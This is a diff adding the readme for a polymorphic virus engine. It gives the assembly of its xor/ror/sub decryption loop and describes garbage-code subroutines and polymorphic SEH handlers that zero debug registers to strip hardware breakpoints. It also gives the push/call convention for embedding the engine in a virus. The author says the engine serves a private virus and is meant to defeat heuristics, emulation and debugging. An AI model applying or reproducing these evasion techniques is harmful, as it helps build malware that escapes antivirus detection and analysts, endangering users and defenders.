@@ -1,0 +1,80 @@
+                          poly  engine
+                          ~~~~~~~~~~~~
+                                           deroko <deroko<at>gmail<dot>com>
+                                           http://deroko.headcoders.net 
+
+1. Theory
+~~~~~~~~~
+As usual poly engines are used to generate decryptor for virus.
+Thats all about theory.
+
+2. How does this work?
+~~~~~~~~~~~~~~~~~~~~~~
+First of all, there is predefined decryption algo, so your code
+must be encrypted with appropriate algo (example\test.asm)
+Algo goes like this:
+
+                     rdtsc
+                     add           eax, edx
+                     mov           ecx, sizecrypted
+                     shr           ecx, 2
+                     mov           edi, offset code
+__spin_crypt:        xor           dword ptr[edi], eax
+                     ror           dword ptr[edi], 16
+                     sub           dword ptr[edi], eax
+                     add           edi, 4
+                     loop          __spin_crypt
+it consist of xor/ror/sub and decryption integrated into poly is
+
+                     add           [reg1], reg2
+                     ror           [reg1], 16
+                     xor           [reg1], reg2
+                     
+These are the rules that engine follows.
+
+Engines uses 3 predefined subroutines as garbage, and uses 1 randomly
+generated sub which consist of garbagegenerator + SEH
+Also there are at least 3 SEHs in da poly decryptor, and their purpose
+is to remove hardware breakpoints using CONTEXT structure, so all hardware
+breakpoints will be removed.
+SEH is also polymorphic and it uses different regs + mov/and to change 
+CONTEXT_Dr0/Dr3 to 0
+
+It ain't powerful polyengin, but it works fine...
+
+3. How to use it
+~~~~~~~~~~~~~~~~
+
+syntax:
+                     push          cryptkey
+                     push          _where_to_generate_poly
+                     push          virussize
+                     push          virus_virtual_address
+                     call          poly
+                     
+inside of virus poly should be called with CALL b/c it uses RET at the end.
+Example:
+                     [call         polyengin]
+                     [VVVVVVVVVVVVVVVVVVVVVV]
+                     [IIIIIIIIIIIIIIIIIIIIII]
+                     [RRRRRRRRRRRRRRRRRRRRRR]
+                     [UUUUUUUUUUUUUUUUUUUUUU]
+                     [SSSSSSSSSSSSSSSSSSSSSS]
+                     [    POLY_DECRYPTOR    ]
+
+
+Well that's it... This poly is used in blacky.virus (still private) which uses
+runtime decryption to foobar heuristic/emulation/debugging... 
+There are some random memory acceses... using regbase...
+FPU is used as garbage...
+
+Polymorphic (generated decryptor) is not larger than 1300 bytes, actually it 
+did not generate bigger decryptor than 1300 bytes so it should be optimal size
+for poly's buffer...
+
+
+       
+                                           deroko <deroko<at>gmail<dot>com>
+                                           http://deroko.headcoders.net
+                                          
+                           
